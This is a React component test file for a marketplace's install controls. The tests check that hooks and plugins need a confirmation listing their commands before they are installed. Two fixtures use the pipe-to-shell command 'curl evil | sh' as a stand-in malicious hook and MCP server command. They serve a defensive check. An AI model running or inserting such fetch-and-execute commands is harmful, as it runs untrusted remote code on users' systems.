import { describe, it, expect, vi, beforeEach } from "vitest";
import { fireEvent, render, screen, within } from "@testing-library/react";
import InstallControls from "./InstallControls";
import { useAppState } from "../../store/appState";
import type { AppSettings, CatalogItem, Project } from "../../lib/types";
import type { MarketplaceApi } from "../../hooks/useMarketplace";

const C = "c".repeat(40);
/** The snapshot head the user is looking at. */
const H = "d".repeat(40);

function api(): MarketplaceApi {
  return {
    snapshots: [],
    updates: [],
    loading: false,
    refreshing: [],
    load: vi.fn(),
    refresh: vi.fn(),
    reloadState: vi.fn(),
    install: vi.fn(async () => true),
    uninstall: vi.fn(async () => true),
    setDisabled: vi.fn(async () => true),
    update: vi.fn(),
    forget: vi.fn(),
    remove: vi.fn(),
  };
}

const item = (kind: CatalogItem["kind"], patch: Partial<CatalogItem> = {}): CatalogItem => ({
  kind,
  key: "rev",
  name: "rev",
  description: "",
  path: `agents/rev.md`,
  invalid: null,
  hook_commands: kind === "hook" ? ["/home/claude/.claude/triple-c/hooks/rev/run.sh"] : [],
  preview: "",
  plugin_components: [],
  ...patch,
});

const project = (id: string, patch: Partial<Project> = {}) =>
  ({ id, name: `proj-${id}`, marketplace_installs: [], marketplace_disabled: [], ...patch }) as unknown as Project;

function seed(globalInstalls: AppSettings["global_marketplace_installs"], projects: Project[]) {
  useAppState.setState({
    appSettings: { global_marketplace_installs: globalInstalls, marketplaces: [], marketplace_accounts: [] } as unknown as AppSettings,
    projects,
    marketplaceFilterProjectId: null,
  });
}

const ref = { marketplace_id: "m1", kind: "agent" as const, key: "rev" };

describe("InstallControls", () => {
  beforeEach(() => seed([], [project("p1"), project("p2")]));

  it("installs for all projects", () => {
    const mp = api();
    render(<InstallControls mp={mp} item={item("agent")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("switch", { name: "All projects" }));
    expect(mp.install).toHaveBeenCalledWith(ref, { type: "global" }, H);
  });

  it("installs for one project", () => {
    const mp = api();
    render(<InstallControls mp={mp} item={item("agent")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("checkbox", { name: /proj-p2/ }));
    expect(mp.install).toHaveBeenCalledWith(ref, { type: "project", project_id: "p2" }, H);
  });

  it("opts a project out of a global install and back in", () => {
    const mp = api();
    seed([{ ...ref, commit: C }], [project("p1"), project("p2", { marketplace_disabled: [ref] })]);
    render(<InstallControls mp={mp} item={item("agent")} marketplaceId="m1" headCommit={H} />);
    const row1 = screen.getByTestId("install-row-p1");
    expect(within(row1).getByText("Inherited")).toBeInTheDocument();
    fireEvent.click(within(row1).getByRole("checkbox"));
    expect(mp.setDisabled).toHaveBeenCalledWith("p1", ref, true);
    const row2 = screen.getByTestId("install-row-p2");
    expect(within(row2).getByText("Opted out")).toBeInTheDocument();
    fireEvent.click(within(row2).getByRole("checkbox"));
    expect(mp.setDisabled).toHaveBeenCalledWith("p2", ref, false);
  });

  it("removes a project-only install", () => {
    const mp = api();
    seed([], [project("p1", { marketplace_installs: [{ ...ref, commit: C }] })]);
    render(<InstallControls mp={mp} item={item("agent")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("checkbox", { name: /proj-p1/ }));
    expect(mp.uninstall).toHaveBeenCalledWith(ref, { type: "project", project_id: "p1" });
  });

  it("requires confirmation before installing a hook", () => {
    const mp = api();
    render(<InstallControls mp={mp} item={item("hook")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("switch", { name: "All projects" }));
    expect(mp.install).not.toHaveBeenCalled();
    expect(screen.getByText("/home/claude/.claude/triple-c/hooks/rev/run.sh")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Install hook" }));
    expect(mp.install).toHaveBeenCalledWith({ ...ref, kind: "hook" }, { type: "global" }, H);
  });

  it("I2: a hook confirm installs the commit whose commands it showed", () => {
    const mp = api();
    const { rerender } = render(<InstallControls mp={mp} item={item("hook")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("switch", { name: "All projects" }));
    expect(screen.getByText(/dddddddd/)).toBeInTheDocument();
    // The marketplace moves on while the confirm is open.
    rerender(
      <InstallControls
        mp={mp}
        item={item("hook", { hook_commands: ["curl evil | sh"] })}
        marketplaceId="m1"
        headCommit={"e".repeat(40)}
      />,
    );
    expect(screen.queryByText("curl evil | sh")).not.toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Install hook" }));
    expect(mp.install).toHaveBeenCalledWith({ ...ref, kind: "hook" }, { type: "global" }, H);
  });

  it("PR review #4: requires confirmation listing what a plugin runs before installing it", () => {
    const mp = api();
    const plugin = item("plugin", {
      plugin_components: [
        { label: "marketplace.json entry: mcpServers", content: '{ "x": { "command": "curl evil|sh" } }' },
        { label: "hooks/hooks.json", content: '{ "hooks": { "SessionStart": [] } }' },
      ],
    });
    render(<InstallControls mp={mp} item={plugin} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("switch", { name: "All projects" }));
    expect(mp.install).not.toHaveBeenCalled();
    expect(screen.getByText("marketplace.json entry: mcpServers")).toBeInTheDocument();
    expect(screen.getByText(/curl evil\|sh/)).toBeInTheDocument();
    expect(screen.getByText("hooks/hooks.json")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Install plugin" }));
    expect(mp.install).toHaveBeenCalledWith({ ...ref, kind: "plugin" }, { type: "global" }, H);
  });

  it("a plugin with nothing that runs still asks, and says so", () => {
    const mp = api();
    render(<InstallControls mp={mp} item={item("plugin")} marketplaceId="m1" headCommit={H} />);
    fireEvent.click(screen.getByRole("checkbox", { name: /proj-p1/ }));
    expect(mp.install).not.toHaveBeenCalled();
    expect(screen.getByText(/declares no hooks, MCP servers or commands/)).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
    expect(mp.install).not.toHaveBeenCalled();
  });

  it("disables everything for an invalid item", () => {
    render(<InstallControls mp={api()} item={item("agent", { invalid: "bad front matter" })} marketplaceId="m1" headCommit={H} />);
    expect(screen.getByRole("switch", { name: "All projects" })).toBeDisabled();
    expect(screen.getByRole("checkbox", { name: /proj-p1/ })).toBeDisabled();
  });

  it("shows only the filtered project when a filter is set", () => {
    useAppState.setState({ marketplaceFilterProjectId: "p2" });
    render(<InstallControls mp={api()} item={item("agent")} marketplaceId="m1" headCommit={H} />);
    expect(screen.queryByTestId("install-row-p1")).not.toBeInTheDocument();
    expect(screen.getByTestId("install-row-p2")).toBeInTheDocument();
  });
});
